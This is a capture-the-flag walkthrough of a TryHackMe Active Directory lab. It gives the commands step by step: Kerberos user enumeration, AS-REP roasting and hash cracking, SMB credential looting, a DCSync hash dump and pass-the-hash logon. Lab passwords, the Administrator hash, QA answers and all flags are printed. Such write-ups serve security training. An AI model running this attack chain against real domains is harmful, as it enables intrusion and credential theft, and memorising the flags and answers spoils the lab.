# Attacktive Directory — Complete Lab Walkthrough & Documentation

### Overview
Attacktive Directory is a hands-on Active Directory penetration testing environment on TryHackMe. This document provides a complete end-to-end walkthrough covering initial network enumeration, account discovery via Kerberos, AS-REP roasting, SMB enumeration, DCSync domain escalation, and final flag retrieval.

Target Information
- Target IP: ```10.49.166.82```
- Domain Name: ```spookysec.local```
- Domain TLD: ```local```
- NetBIOS Domain Name: ```THM-AD```
- NetBIOS Computer Name: ```ATTACKTIVEDIREC```

### Task 1 & 2: Machine Deployment & Setup
1. Network Connectivity
Establish an OpenVPN connection to the TryHackMe network:
```bash
sudo openvpn --config <your_config>.ovpn
```
2. Tooling Installation
Active Directory exploitation requires specialized toolsets for Kerberos manipulation, LDAP interactions, and hash dumping:
```bash
# Install Impacket framework
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket && python3 ./setup.py install

# Install BloodHound and Neo4j
sudo apt update && sudo apt install bloodhound neo4j -y
```
### Task 3: Network & Service Enumeration
1. Port Scanning
Perform a comprehensive service scan using Nmap:
```bash
nmap -sV -sC -p- 10.49.166.82
```
#### Discovered Key Ports:
- Port 53 (DNS): Domain Name System
- Port 88 (Kerberos): Active Directory Authentication
- Port 135 (MSRPC): Microsoft RPC Service
- Port 139 / 445 (SMB): NetBIOS / Server Message Block
- Port 389 / 3268 (LDAP): Active Directory Global Catalog
- Port 5985 (WinRM): Windows Remote Management

#### Task 3 QA Summary
- Tool for port & service enumeration: ```nmap```
- Tool for SMB enumeration (port 139/445): ```enum4linux```
- NetBIOS Domain Name: ```THM-AD```
- Domain TLD: ```local```

### Task 4: Kerberos User Enumeration
1. User Bruteforcing with Kerbrute
Kerbrute enumerates valid Active Directory users by sending Kerberos Pre-Authentication requests without causing account lockouts.
```bash
./kerbrute userenum -d spookysec.local --dc 10.49.166.82 user.txt
```
#### Identified Key Accounts:
- ```svc-admin@spookysec.local``` (Service Account)
- ```backup@spookysec.local``` (Backup Account)
- ```administrator@spookysec.local```

Task 4 QA Summary
- Kerbrute user enumeration subcommand: ```userenum```
- Notable account #1: ```svc-admin```
- Notable account #2: ```backup```

### Task 5: AS-REP Roasting (Abusing Kerberos)
1. Requesting AS-REP Tickets
Accounts with the "Do not require Kerberos preauthentication" property set (```DONT_REQ_PREAUTH```) allow any user to request a Kerberos ticket encrypted with the user's password hash.

Run Impacket's ```GetNPUsers.py``` against the list of discovered usernames (```valid_user.txt```):
```bash
impacket-GetNPUsers spookysec.local/ -usersfile valid_user.txt -request
```
Result:
Target user svc-admin@spookysec.local is vulnerable and yields an AS-REP hash (```$krb5asrep$23...```).   

2. Offline Hash Cracking
Save the hash to ```hash.txt``` and crack it using John the Ripper:
```bash
john --wordlist=password.txt hash.txt
john hash.txt --show
```
- Cracked Credentials: svc-admin : management2005   

Task 5 QA Summary
- Target account for ticket query: ```svc-admin```
- Kerberos Hash Type: ```Kerberos 5 AS-REP etype 23```
- Hashcat Mode ID: ```18200```
- Account Password: ```management2005```

### Task 6: Authenticated SMB Enumeration & File Retrieval
1. Share Mapping
Map the remote SMB shares using ```smbclient``` and the credentials for ```svc-admin```:
```bash
smbclient -L '//10.49.166.82' -U svc-admin
```
Total Shares Identified (6 Shares):
ADMIN$, C$, IPC$, NETLOGON, SYSVOL, and custom share backup.   

2. Accessing the Backup Share
Connect to ```backup``` and inspect contents:
```bash
smbclient '//10.49.166.82/backup' -U svc-admin
smb: \> get backup_credentials.txt
```
3. Decoding Credentials
Inspect and decode the base64 string contained in ```backup_credentials.txt```:
```bash
cat backup_credentials.txt
# Output: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 --decode
# Output: backup@spookysec.local:backup2517860
```
- Recovered Credentials: backup : backup2517860

Task 6 QA Summary
- SMB Utility: ```smbclient```
- Share List Flag: ```-L```
- Number of Listed Shares: ```6```
- Target Share Name: ```backup```
- Encoded Content: ```YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw```
- Decoded Content: ```backup@spookysec.local:backup2517860```

### Task 7: Domain Privilege Escalation (DCSync Attack)
1. NTDS.dit Secret Dumping
The ```backup``` account has Active Directory replication privileges (```DS-Replication-Get-Changes-All```). Perform a DCSync attack using Impacket's ```secretsdump.py``` to dump all domain password hashes:
```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.49.166.82
```
Extraction Results:
- Dumping Protocol: ```DRSUAPI```
- Administrator NTLM Hash: ```0e0363213e37b94221497260b0bcb4fc```

2. Pass-the-Hash via Evil-WinRM
Authenticate as Administrator over WinRM using the extracted NTLM hash without cracking the password:
```bash
evil-winrm -i 10.49.166.82 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```
Task 7 QA Summary
- NTDS Dumping Method: ```DRSUAPI```
- Administrator NTLM Hash: ```0e0363213e37b94221497260b0bcb4fc```
- Authentication Attack Method: ```Pass The Hash```
- Evil-WinRM Hash Flag: ```-H```

### Task 8: Flag Retrieval
Having obtained full administrative Remote Management shell access, browse user profiles to collect all three flags.
1. svc-admin Flag
  - Path: ```C:\Users\svc-admin\Desktop\user.txt.txt```
  - Flag: ```TryHackMe{K3rb3r0s_Pr3_4uth}```
2. backup Flag
  - Path: ```C:\Users\backup\Desktop\PrivEsc.txt```
  - Flag: ```TryHackMe{B4ckm3UpSc0tty!}```
3. Administrator (Root) Flag
  - Path: ```C:\Users\Administrator\Desktop\root.txt```
  - Flag: ```TryHackMe{4ctiveD1rectoryM4st3r}```
